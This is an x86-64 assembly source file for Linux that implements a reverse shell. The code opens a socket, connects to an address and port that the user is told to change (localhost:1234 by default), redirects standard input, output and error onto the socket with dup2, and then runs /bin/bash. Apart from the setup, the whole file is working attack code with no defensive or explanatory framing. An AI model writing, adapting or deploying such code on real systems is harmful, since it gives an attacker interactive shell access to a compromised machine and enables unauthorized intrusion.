global _start

%include "./src/ip_to_int.asm"

%define AF_INET 2
%define EXIT 60
%define SOCKET 41
%define CONNECT 42
%define DUP2 33
%define SOCK_STREAM 1
%define EXECVE 59

section .text

_start:
    push rbp
    mov rbp, rsp
    sub rsp, 16

    mov rdi, AF_INET
    mov rsi, SOCK_STREAM
    xor rdx, rdx
    mov rax, SOCKET
    syscall
    mov dword [s], eax

    mov word  [rsp],   AF_INET

    mov bx, PORT
    xchg bh, bl ; PORT in bx
    mov word [rsp+2], bx

    lea rdi, [IP_ADDR]
    call ip_to_int ; IP in eax
    bswap eax
    mov dword [rsp+4], eax

    mov qword [rsp+8], 0 ; padding

    mov edi, [s]
    lea rsi, [rsp]
    mov rdx, 16
    mov rax, CONNECT
    syscall

    mov edi, [s]
    mov rsi, 0
    mov rax, DUP2
    syscall

    mov edi, [s]
    mov rsi, 1
    mov rax, DUP2
    syscall

    mov edi, [s]
    mov rsi, 2
    mov rax, DUP2
    syscall

    lea rdi, [binary]
    lea rsi, [argv]
    xor rdx, rdx
    mov rax, EXECVE
    syscall

    leave
    xor rdi, rdi
    mov rax, EXIT
    syscall

section .data
s: dd 0
binary: db "/bin/bash", 0
argv: dq binary, 0

; Change
PORT: equ 1234
IP_ADDR: db "127.0.0.1", 0
